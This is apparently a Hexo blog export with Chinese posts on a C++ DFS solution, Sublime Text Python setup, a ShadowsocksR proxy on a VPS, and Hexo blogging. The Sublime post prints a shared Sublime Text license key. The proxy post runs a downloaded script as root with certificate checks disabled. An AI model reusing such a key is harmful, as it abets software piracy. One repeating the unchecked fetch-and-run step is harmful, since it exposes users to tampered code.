class="line">            <span class="keyword">continue</span> ;  </span><br><span class="line">        &#125;  </span><br><span class="line">        <span class="built_in">memset</span>(visited,<span class="literal">false</span>,<span class="keyword">sizeof</span>(visited)) ;  <span class="comment">//初始化</span></span><br><span class="line">        ans = INT_MAX ;  </span><br><span class="line">        DFS(<span class="number">0</span>,<span class="number">0</span>,<span class="built_in">map</span>[<span class="number">0</span>][<span class="number">0</span>],<span class="number">1</span>) ;  </span><br><span class="line">        <span class="keyword">if</span>(ans == INT_MAX)  </span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"0\n"</span>) ;  </span><br><span class="line">        <span class="keyword">else</span>  </span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"%d\n"</span>,ans) ;  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span> ;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> 算法 </tag>
            
            <tag> c++ </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>sublime搭建简易python环境</title>
      <link href="/sublime%E6%90%AD%E5%BB%BA%E7%AE%80%E6%98%93python%E7%8E%AF%E5%A2%83.html"/>
      <content type="html"><![CDATA[<blockquote class="blockquote-center">选一个方向，定一个时间，剩下的只管努力与坚持</blockquote><p><img src="http://p5m1dtoh7.bkt.clouddn.com/sublime%E6%90%AD%E5%BB%BApython%E7%8E%AF%E5%A2%83/sublime_face.webp" alt=""></p><a id="more"></a><h2 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h2><p>正式版（3143）：<br>下载地址：<em><a href="https://www.sublimetext.com/3" target="_blank" rel="noopener">https://www.sublimetext.com/3</a></em></p><p>Dev Builds（3156）：<br>下载地址：<em><a href="https://www.sublimetext.com/3dev" target="_blank" rel="noopener">https://www.sublimetext.com/3dev</a></em></p><p>插件地址：<em><a href="https://packagecontrol.io/" target="_blank" rel="noopener">https://packagecontrol.io/</a></em></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">-----  BEGIN  LICENSE  -----</span><br><span class="line">eldon</span><br><span class="line">Single  User  License</span><br><span class="line">EA7E-1122628</span><br><span class="line">C0360740  20724B8A  30420C09  6D7E046F</span><br><span class="line">3F5D5FBB  17EF95DA  2BA7BB27  CCB14947</span><br><span class="line">27A316BE  8BCF4BC0  252FB8FF  FD97DF71</span><br><span class="line">B11A1DA9  F7119CA0  31984BB9  7D71700C</span><br><span class="line">2C728BF8  B952E5F5  B941FF64  6D7979DA</span><br><span class="line">B8EB32F8  8D415F8E  F16FE657  A35381CC</span><br><span class="line">290E2905  96E81236  63D2B06D  E5F01A69</span><br><span class="line">84174B79  7C467714  641A9013  94CA7162</span><br><span class="line">------  END  LICENSE  ------</span><br></pre></td></tr></table></figure><p><em><strong>注：大家请支持正版,注册码来自于网络仅用户学习交流,非法使用与本人无关,侵权联系本人删除!</strong></em></p><h2 id="插件安装"><a href="#插件安装" class="headerlink" title="插件安装"></a>插件安装</h2><h3 id="Package-Control"><a href="#Package-Control" class="headerlink" title="Package Control"></a>Package Control</h3><p>首先看下<code>Preferences</code>下面有没有<code>Package Control</code>这个选项，如果有，直接点击安装。没有，按 Ctrl+` 调出 console ，粘贴以下代码到底部命令行并回车：<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.request,os,hashlib; h = <span class="string">'6f4c264a24d933ce70df5dedcf1dcaee'</span> + <span class="string">'ebe013ee18cced0ef93d5f746d80ef60'</span>; pf = <span class="string">'Package Control.sublime-package'</span>; ipp = sublime.installed_packages_path(); urllib.request.install_opener( urllib.request.build_opener( urllib.request.ProxyHandler()) ); by = urllib.request.urlopen( <span class="string">'http://packagecontrol.io/'</span> + pf.replace(<span class="string">' '</span>, <span class="string">'%20'</span>)).read(); dh = hashlib.sha256(by).hexdigest(); print(<span class="string">'Error validating download (got %s instead of %s), please try manual install'</span> % (dh, h)) <span class="keyword">if</span> dh != h <span class="keyword">else</span>  open(os.path.join( ipp, pf), <span class="string">'wb'</span> ).write(by)</span><br></pre></td></tr></table></figure></p><p>重启 Sublime Text 3。如果在 <code>Perferences-&gt;package settings 中看到 package control</code> 这一项，则安装成功。按下 Ctrl+Shift+P 调出命令面板输入 install 调出 Install Package 选项并回车，然后在列表中选中要安装的插件。</p><h3 id="Anaconda"><a href="#Anaconda" class="headerlink" title="Anaconda"></a>Anaconda</h3><p>Anaconda 是一个终极 Python 插件。它为 ST3 增添了多项 IDE 类似的功能，例如：</p><ul><li>Autocompletion 自动完成，该选项默认开启，同时提供多种配置选项。</li><li>Code linting 使用支持 pep8 标准的 PyLint 或者 PyFlakes。</li><li>McCabe code complexity checker 让你可以在特定的文件中使用 McCabe complexity checker.</li><li>Goto Definitions 能够在你的整个工程中查找并且显示任意一个变量，函数，或者类的定义。</li><li>Find Usage 能够快速的查找某个变量，函数或者类在某个特定文件中的什么地方被使用了。</li><li>Show Documentation： 能够显示一个函数或者类的说明性字符串(当然，是在定义了字符串的情况下)</li></ul><p>使用快捷键<code>ctrl+shift+p</code>调出控制面板，选中<code>package control: install package</code>，等待一会出现另一个控制面板，输入<strong>anaconda</strong>回车进行安装</p><p>  但是，刚安装完之后，打开一个 python 文档，所有代码都会被白色细线框中，如图所示；</p><p>  强迫症的我看着好难受，决心要搞一搞这东西。后来发现在 Sublime &gt; Preferences &gt; Package Settings &gt; Anaconda &gt; Settings – Default 下修改 linting behaviour 选项即可，我这里改成了只有在保存的时候linting工作。</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">/*</span><br><span class="line">    Sets the linting behaviour <span class="keyword">for</span> anaconda:</span><br><span class="line"></span><br><span class="line">    <span class="string">"always"</span> - Linting works always even <span class="keyword">while</span> you are writing (<span class="keyword">in</span> the background)</span><br><span class="line">    <span class="string">"load-save"</span> - Linting works <span class="keyword">in</span> file load <span class="keyword">and</span> save only</span><br><span class="line">    <span class="string">"save-only"</span> - Linting works <span class="keyword">in</span> file save only</span><br><span class="line">*/</span><br><span class="line"><span class="string">"anaconda_linting_behaviour"</span>: <span class="string">"save-only"</span>,</span><br></pre></td></tr></table></figure><h3 id="SublimeTmpl"><a href="#SublimeTmpl" class="headerlink" title="SublimeTmpl"></a>SublimeTmpl</h3><p>快速生成文件模板，SublimeTmpl能新建html、css、javascript、php、python、ruby六种类型的文件模板，所有的文件模板都在插件目录的templates文件夹里，可以自定义编辑文件模板。</p><p>使用快捷键<code>ctrl+shift+p</code>调出控制面板，选中<code>package control: install package</code>，等待一会出现另一个控制面板，输入<strong>SublimeTmpl</strong>回车进行安装</p><p>SublimeTmpl默认的快捷键:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ctrl+alt+h html</span><br><span class="line">ctrl+alt+j javascript</span><br><span class="line">ctrl+alt+c css</span><br><span class="line">ctrl+alt+p php</span><br><span class="line">ctrl+alt+r ruby</span><br><span class="line">ctrl+alt+shift+p python</span><br></pre></td></tr></table></figure></p><p>这里我想修改一下python模板，可以到<code>Data\Packages\SublimeTmpl\templates</code>目录下修改<code>python</code>模板:<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Date    : $&#123;date&#125;</span></span><br><span class="line"><span class="comment"># @Author  : $&#123;author&#125;</span></span><br><span class="line"><span class="comment"># @Email   : $&#123;email&#125;</span></span><br><span class="line"><span class="comment"># @Link    : $&#123;link&#125;</span></span><br></pre></td></tr></table></figure></p><p>然后进行如下操作：<code>Sublime &gt; Preferences &gt; Package Settings &gt; SublimeTmpl &gt; Settings – User</code> 添加如下代码。然后 <code>ctrl+alt+shift+p</code>来新建一个模板试试看：<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#123;  </span><br><span class="line">    <span class="string">"disable_keymap_actions"</span>: false, // <span class="string">"all"</span>; <span class="string">"html,css"</span>  </span><br><span class="line">    <span class="string">"date_format"</span> : <span class="string">"%Y-%m-%d %H:%M:%S"</span>,  </span><br><span class="line">    <span class="string">"attr"</span>: &#123;  </span><br><span class="line">        <span class="string">"author"</span>: <span class="string">""</span>,  </span><br><span class="line">        <span class="string">"email"</span>: <span class="string">""</span>,  </span><br><span class="line">        <span class="string">"link"</span>: <span class="string">"http://longofo.cc"</span>,</span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="SublimeREPL"><a href="#SublimeREPL" class="headerlink" title="SublimeREPL"></a>SublimeREPL</h3><p>使用快捷键<code>ctrl+shift+p</code>调出控制面板，选中<code>package control: install package</code>，等待一会出现另一个控制面板，输入<strong>SublimeREPL</strong>回车进行安装</p><p><strong>键位绑定</strong><br>在<code>Preferences-&gt;Key Bindings-User</code>，复制一下代码：<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="string">"keys"</span>:[<span class="string">"f1"</span>],</span><br><span class="line">    <span class="string">"caption"</span>: <span class="string">"SublimeREPL: Python"</span>,</span><br><span class="line">    <span class="string">"command"</span>: <span class="string">"run_existing_window_command"</span>, <span class="string">"args"</span>:</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="string">"id"</span>: <span class="string">"repl_python"</span>,</span><br><span class="line">    <span class="string">"file"</span>: <span class="string">"config/Python/Main.sublime-menu"</span></span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure></p><p>然后就可以通过f1来快速打开python解释器界面</p><p>效果：<img src="http://p5m1dtoh7.bkt.clouddn.com/sublime%E6%90%AD%E5%BB%BApython%E7%8E%AF%E5%A2%83/%E6%89%93%E5%BC%80python%E5%91%BD%E4%BB%A4%E8%A1%8C%E8%A7%A3%E9%87%8A%E5%99%A8.PNG" alt=""></p><h2 id="常用快捷键"><a href="#常用快捷键" class="headerlink" title="常用快捷键"></a>常用快捷键</h2><ul><li>跳转</li><li>到任意内容：<code>ctrl+p</code> 用来快速查找和打开文件。你仅仅只需要工程中文件的一部分路径或者文件名你就可以很容易的打开这个文件。这在一个大型的 Django 工程中显得非常方便。</li><li>跳转到指定行：<code>ctrl+g</code>让你在当前文件中跳转到指定行数。</li><li>跳转到标志 ：<code>cmd+r</code> 可以列出当前文件中所有的函数或者类，让你更方便查找。你可以通过输入关键字来查找你所需要的函数或者类。</li><li>跳转到行首：<code>ctrl+left-arrow-key</code> 与 跳转到行尾 <code>cmd+right-arrow-key</code></li><li>删除当前行：<code>ctrl+shift+k</code></li><li>多重编辑：选定一个单词，点击 <code>cmd+d</code>来选择同样的单词，再次点击 <code>cmd+d</code>继续选择下一个单词…<br>或者 <code>cmd+单击</code>来指定多个你想要同时修改的地方。</li><li>查找：<code>ctrl+f</code>，普通的字符串查找就不用说了，这里说下正则查找，如下图，将.*位置选上:<img src="http://p5m1dtoh7.bkt.clouddn.com/sublime%E6%90%AD%E5%BB%BApython%E7%8E%AF%E5%A2%83/%E6%AD%A3%E5%88%99%E6%9F%A5%E6%89%BE.png" alt=""></li><li>替换： <code>ctrl+h</code>，不同字符串替换很简单，同样这里只说正则替换，如下图:<ul><li>替换前：<img src="http://p5m1dtoh7.bkt.clouddn.com/sublime%E6%90%AD%E5%BB%BApython%E7%8E%AF%E5%A2%83/%E6%AD%A3%E5%88%99%E6%9B%BF%E6%8D%A2%E5%89%8D.jpg" alt=""></li><li>替换后：<img src="http://p5m1dtoh7.bkt.clouddn.com/sublime%E6%90%AD%E5%BB%BApython%E7%8E%AF%E5%A2%83/%E6%AD%A3%E5%88%99%E6%9B%BF%E6%8D%A2%E5%90%8E.jpg" alt=""></li></ul></li></ul><h2 id="python版本切换"><a href="#python版本切换" class="headerlink" title="python版本切换"></a>python版本切换</h2><p><code>tools-&gt;build system-&gt;new build system</code>，分别创建<code>Python27.sublime-build</code>:</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line"><span class="string">"cmd"</span>: [<span class="string">"C:/Python27/python.exe"</span>,<span class="string">"-u"</span>,<span class="string">"$file"</span>],</span><br><span class="line"></span><br><span class="line"><span class="string">"file_regex"</span>: <span class="string">"^[ ]*File \"(...*?)\", line ([0-9]*)"</span>,</span><br><span class="line"></span><br><span class="line"><span class="string">"selector"</span>: <span class="string">"source.python"</span>,</span><br><span class="line"></span><br><span class="line"><span class="string">"encoding"</span>: <span class="string">"utf-8"</span>,</span><br><span class="line"></span><br><span class="line"><span class="string">"env"</span>: &#123;<span class="string">"PYTHONIOENCODING"</span>: <span class="string">"utf-8"</span>&#125;,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>和<code>Python36.sublime-build</code>：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line"><span class="string">"cmd"</span>: [<span class="string">"C:/Python36/python.exe"</span>,<span class="string">"-u"</span>,<span class="string">"$file"</span>],</span><br><span class="line"></span><br><span class="line"><span class="string">"file_regex"</span>: <span class="string">"^[ ]*File \"(...*?)\", line ([0-9]*)"</span>,</span><br><span class="line"></span><br><span class="line"><span class="string">"selector"</span>: <span class="string">"source.python"</span>,</span><br><span class="line"></span><br><span class="line"><span class="string">"encoding"</span>: <span class="string">"utf-8"</span>,</span><br><span class="line"></span><br><span class="line"><span class="string">"env"</span>: &#123;<span class="string">"PYTHONIOENCODING"</span>: <span class="string">"utf-8"</span>&#125;,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>注:代码中cmd里面的路径为你自己的python路径</strong></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><em><strong><a href="http://blog.csdn.net/u011475210/article/details/78168341" target="_blank" rel="noopener">http://blog.csdn.net/u011475210/article/details/78168341</a></strong></em><br><em><strong><a href="https://www.jianshu.com/p/a401a0bfddf7" target="_blank" rel="noopener">https://www.jianshu.com/p/a401a0bfddf7</a></strong></em><br><em><strong><a href="http://blog.csdn.net/wooder111/article/details/78749614" target="_blank" rel="noopener">http://blog.csdn.net/wooder111/article/details/78749614</a></strong></em></p>]]></content>
      
      <categories>
          
          <category> 搭建 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> 搭建 </tag>
            
            <tag> sublime </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>科学上网-ShadowsocksR+vps</title>
      <link href="/%E7%A7%91%E5%AD%A6%E4%B8%8A%E7%BD%91-ShadowsocksR-vps.html"/>
      <content type="html"><![CDATA[<blockquote class="blockquote-center">这世界的大多数事情，不是稍微努力就可以搞定</blockquote><p><img src="http://p5m1dtoh7.bkt.clouddn.com/%E7%A7%91%E5%AD%A6%E4%B8%8A%E7%BD%91/ssr%E7%A7%91%E5%AD%A6%E4%B8%8A%E7%BD%91.png" alt=""></p><a id="more"></a><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><h3 id="常见的科学上网的方式"><a href="#常见的科学上网的方式" class="headerlink" title="常见的科学上网的方式"></a>常见的科学上网的方式</h3><ul><li>Shadowsocks(R)</li><li>VPN</li><li>Lantern</li></ul><p>目前而言，<code>Lantern</code>因为其一键启动的特性，所以小白用户使用不在少数，但主要用于<code>Google</code>和<code>twitter</code>等。</p><p>然而当对科学上网的使用有高带宽需求（如看高清的<code>youtube</code>、<code>PH</code>）的时候，<code>Lantern</code>就显得力不从心了。</p><p><code>VPN</code>的使用也较为简单，并且是早起科学上网的主要方式，因此是ZF重点的打击对象。 <code>VPN</code>由于其端口基本固定，且流量特征易被检测封堵，现在已经越来越少有用户使用其进行科学上网。</p><p><code>Shadowsocks</code>（简称SS）的出现以后，它端口任意，流量无明显特征的优点使得其迅速成为科学上网人士的首选。 不过，<code>ShadowsocksR</code>（简称<code>SSR</code>）则更进一步，将流量伪装成http等“常规的”网络流量，进一步加大了检测封堵的难度。</p><p>关于科学上网的方式及原理的更多介绍，请参考文章<a href="http://chinadigitaltimes.net/chinese/2016/01/%E5%87%A0%E7%A7%8D%E5%B8%B8%E8%A7%81%E7%9A%84%E7%A7%91%E5%AD%A6%E4%B8%8A%E7%BD%91%E6%96%B9%E5%BC%8F/" target="_blank" rel="noopener">几种常见的科学上网方式</a>或手动必应（假设你还没Google，也别用百度）</p><h3 id="进行不可描述操作的基本要求"><a href="#进行不可描述操作的基本要求" class="headerlink" title="进行不可描述操作的基本要求"></a>进行不可描述操作的基本要求</h3><ul><li>英语水平过得去</li><li>有信用卡（当然现在也有部分海外VPS服务商支持支付宝了）</li><li>有基本的<code>Linux</code>使用经验（没有也行，遇到错误就Search就行）</li></ul><h3 id="客户端下载"><a href="#客户端下载" class="headerlink" title="客户端下载"></a>客户端下载</h3><p>电脑版：<a id="download" href="https://softs.fun/%E7%A7%91%E5%AD%A6%E4%B8%8A%E7%BD%91/PC/Shadowsocks/Windows/ShadowsocksR/ShadowsocksR-4.7.0.7z" target="_blank" rel="noopener"><i class="fa fa-download"></i><span> Download Now</span><br></a><br>安卓版：<a id="download" href="https://softs.fun/%E7%A7%91%E5%AD%A6%E4%B8%8A%E7%BD%91/Android/ShadowsocksR/ShadowsocksR-v3.4.0.6.apk" target="_blank" rel="noopener"><i class="fa fa-download"></i><span> Download Now</span></a></p><p><strong>注:</strong> 后面购买VPS需要翻墙，如果你还不能翻墙，可以下载<code>Lantern</code><a id="download" href="https://raw.githubusercontent.com/getlantern/lantern-binaries/master/lantern-installer.exe" target="_blank" rel="noopener"><i class="fa fa-download"></i><span> Download Now</span></a></p><h2 id="购买VPS"><a href="#购买VPS" class="headerlink" title="购买VPS"></a>购买VPS</h2><p>搭建专属SS服务的第一步，是购买海外的VPS（<code>Virtual Private Server</code>）。</p><h3 id="VPS服务商选择"><a href="#VPS服务商选择" class="headerlink" title="VPS服务商选择"></a>VPS服务商选择</h3><p>现有使用较多的VPS服务商有数十家。 海外知名的有<code>BandWagonHost</code>、<code>Linode</code>、<code>Vultr</code>、<code>DigitalOcean</code>等。国内VPS服务商在海外有节点的有阿里云、腾讯云等。（博主使用的是<code>BandWagonHost</code>）</p><p>更多服务商列表请参考<a href="https://www.vpser.net/" target="_blank" rel="noopener">VPSer</a></p><h3 id="购买步骤（以BandWagonHost为例）"><a href="#购买步骤（以BandWagonHost为例）" class="headerlink" title="购买步骤（以BandWagonHost为例）"></a>购买步骤（以BandWagonHost为例）</h3><p>首先去<a href="https://bandwagonhost.com/" target="_blank" rel="noopener"><em>搬瓦工</em></a>注册</p><ul><li>Step1、点击<code>VPS Hosting</code>，根据需要选择配置（建议选择KVM）<br><img src="http://p5m1dtoh7.bkt.clouddn.com/%E7%A7%91%E5%AD%A6%E4%B8%8A%E7%BD%91/vps_buy_step1.PNG" alt=""></li><li>Step2、选择节点(最好选择US Log)<br><img src="http://p5m1dtoh7.bkt.clouddn.com/%E7%A7%91%E5%AD%A6%E4%B8%8A%E7%BD%91/vps_buy_step2.PNG" alt=""></li><li><p>获取优惠码(新用户应该有)<br><img src="http://p5m1dtoh7.bkt.clouddn.com/%E7%A7%91%E5%AD%A6%E4%B8%8A%E7%BD%91/vps_buy_step3.jpg" alt=""><br><img src="http://p5m1dtoh7.bkt.clouddn.com/%E7%A7%91%E5%AD%A6%E4%B8%8A%E7%BD%91/vps_buy_step4.jpg" alt=""><br>填入优惠码<br><img src="http://p5m1dtoh7.bkt.clouddn.com/%E7%A7%91%E5%AD%A6%E4%B8%8A%E7%BD%91/vps_buy_step5.PNG" alt=""></p></li><li><p>购买(支持支付宝付费)<br><img src="http://p5m1dtoh7.bkt.clouddn.com/%E7%A7%91%E5%AD%A6%E4%B8%8A%E7%BD%91/vps_buy_step6.PNG" alt=""></p></li><li><p>系统自己选择(我使用的centos)</p></li></ul><h2 id="安装部署shadowsocksR"><a href="#安装部署shadowsocksR" class="headerlink" title="安装部署shadowsocksR"></a>安装部署shadowsocksR</h2><p>root用户登录，运行以下命令：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">wget --no-check-certificate https://raw.githubusercontent.com/teddysun/shadowsocks_install/master/shadowsocksR.sh</span><br><span class="line"></span><br><span class="line">chmod +x shadowsocksR.sh</span><br><span class="line"></span><br><span class="line">./shadowsocksR.sh 2&gt;&amp;1 | tee shadowsocksR.log</span><br></pre></td></tr></table></figure></p><p>安装过程中根据提示输入信息<br><br><br>安装完成后提示如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Congratulations, ShadowsocksR install completed!</span><br><span class="line">Server IP:your_server_ip</span><br><span class="line">Server Port:your_server_port</span><br><span class="line">Password:your_password</span><br><span class="line">Local IP:127.0.0.1</span><br><span class="line">Local Port:1080</span><br><span class="line">Protocol:origin</span><br><span class="line">obfs:plain</span><br><span class="line">Encryption Method:aes-256-cfb</span><br><span class="line">Welcome to visit:https://shadowsocks.be/9.html</span><br><span class="line">If you want to change protocol &amp; obfs, reference URL:</span><br><span class="line">https://github.com/breakwa11/shadowsocks-rss/wiki/Server-Setup</span><br><span class="line">Enjoy it!</span><br></pre></td></tr></table></figure></p><p><strong>以上信息会在客户端配置中用到</strong><br><br></p><p>卸载方法：<br>使用 root 用户登录，运行以下命令：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./shadowsocksR.sh uninstall</span><br></pre></td></tr></table></figure></p><p>安装完成后即已后台启动 ShadowsocksR ，运行：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/etc/init.d/shadowsocks status</span><br></pre></td></tr></table></figure></p><p>可以查看 ShadowsocksR 进程是否已经启动。<br>本脚本安装完成后，已将 ShadowsocksR 自动加入开机自启动。</p><p>常用命令：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">启动：/etc/init.d/shadowsocks start</span><br><span class="line">停止：/etc/init.d/shadowsocks stop</span><br><span class="line">重启：/etc/init.d/shadowsocks restart</span><br><span class="line">状态：/etc/init.d/shadowsocks status</span><br><span class="line">配置文件路径：/etc/shadowsocks.json</span><br><span class="line">日志文件路径：/var/<span class="built_in">log</span>/shadowsocks.log</span><br><span class="line">代码安装目录：/usr/<span class="built_in">local</span>/shadowsocks</span><br></pre></td></tr></table></figure></p><p>多用户配置 sample：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line"><span class="string">"server"</span>:<span class="string">"0.0.0.0"</span>,</span><br><span class="line"><span class="string">"server_ipv6"</span>: <span class="string">"[::]"</span>,</span><br><span class="line"><span class="string">"local_address"</span>:<span class="string">"127.0.0.1"</span>,</span><br><span class="line"><span class="string">"local_port"</span>:1080,</span><br><span class="line"><span class="string">"port_password"</span>:&#123;</span><br><span class="line">    <span class="string">"8989"</span>:<span class="string">"password1"</span>,</span><br><span class="line">    <span class="string">"8990"</span>:<span class="string">"password2"</span>，</span><br><span class="line">    <span class="string">"8991"</span>:<span class="string">"password3"</span></span><br><span class="line">&#125;,</span><br><span class="line"><span class="string">"timeout"</span>:300,</span><br><span class="line"><span class="string">"method"</span>:<span class="string">"aes-256-cfb"</span>,</span><br><span class="line"><span class="string">"protocol"</span>: <span class="string">"origin"</span>,</span><br><span class="line"><span class="string">"protocol_param"</span>: <span class="string">""</span>,</span><br><span class="line"><span class="string">"obfs"</span>: <span class="string">"plain"</span>,</span><br><span class="line"><span class="string">"obfs_param"</span>: <span class="string">""</span>,</span><br><span class="line"><span class="string">"redirect"</span>: <span class="string">""</span>,</span><br><span class="line"><span class="string">"dns_ipv6"</span>: <span class="literal">false</span>,</span><br><span class="line"><span class="string">"fast_open"</span>: <span class="literal">false</span>,</span><br><span class="line"><span class="string">"workers"</span>: 1</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 id="加速"><a href="#加速" class="headerlink" title="加速"></a>加速</h2><p>参考：<a href="https://github.com/iMeiji/shadowsocks_install/wiki/shadowsocks-optimize" target="_blank" rel="noopener">ShadowsocksR优化加速</a></p><h2 id="shadowsocksR-客户端配置"><a href="#shadowsocksR-客户端配置" class="headerlink" title="shadowsocksR 客户端配置"></a>shadowsocksR 客户端配置</h2><ul><li><p>运行shadowsocksR 客户端，填入你自己服务端配置的信息<br><img src="http://p5m1dtoh7.bkt.clouddn.com/%E7%A7%91%E5%AD%A6%E4%B8%8A%E7%BD%91/ssr%E5%AE%A2%E6%88%B7%E7%AB%AF%E9%85%8D%E7%BD%AE.PNG" alt=""></p></li><li><p>右键右下角飞机图标–&gt;系统代理模式<br>你可以直接选择全局模式，这样不用配置浏览器的代理<br>也可以使用其他模式，配置代理端口，浏览器配置代理ip+端口，具体方式请自行搜索</p></li></ul>]]></content>
      
      <categories>
          
          <category> 科学上网 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 科学上网 </tag>
            
            <tag> ShadowsocksR </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Hexo+github搭建博客折腾笔记</title>
      <link href="/Hexo+github%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2%E6%8A%98%E8%85%BE%E7%AC%94%E8%AE%B0.html"/>
      <content type="html"><![CDATA[<blockquote class="blockquote-center">写博客，就要用心</blockquote><p id="div-border-left-green">&nbsp;&nbsp;&nbsp;&nbsp;看到很多人用hexo+github搭建了自己的博客，自己也很早就想搭建一个个人专属博客,于是搭建了本博客，用于分享一些心得。折腾博客的各种配置以及功能占具了我一部分时间，在此详细记录下我是如何利用hexo+github搭建静态博客以及一些配置相关问题，以免过后遗忘，且当备份之用。</p><a id="more"></a><h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><h3 id="获得个人网站域名"><a href="#获得个人网站域名" class="headerlink" title="获得个人网站域名"></a>获得个人网站域名</h3><blockquote><p>域名是网站的入口，也是网站的第一印象，比如饿了么的官网的域名是：<a href="https://www.ele.me/" target="_blank" rel="noopener">ele.me/</a>，很是巧妙。常见的有com,cn,net,org等后缀，也有小众的xyz,me,io等后缀，根据你自己的喜好，选择不同的后缀，比如我选择就是常见的com后缀。很多小众奇特的后缀在大陆是没办法备案的，网站也就无法上线。然而使用GitHub托管我们的网站，完全不需要备案，因为托管我们的网站内容的服务器在美国，而且在国内备案流程也比较繁杂，时间需要一周左右。</p><p>申请域名的地方有很多，这里推荐阿里云：<a href="https://www.aliyun.com/" target="_blank" rel="noopener">阿里云-为了无法计算的价值</a>  申请入口：<a href="https://wanwang.aliyun.com/domain/" target="_blank" 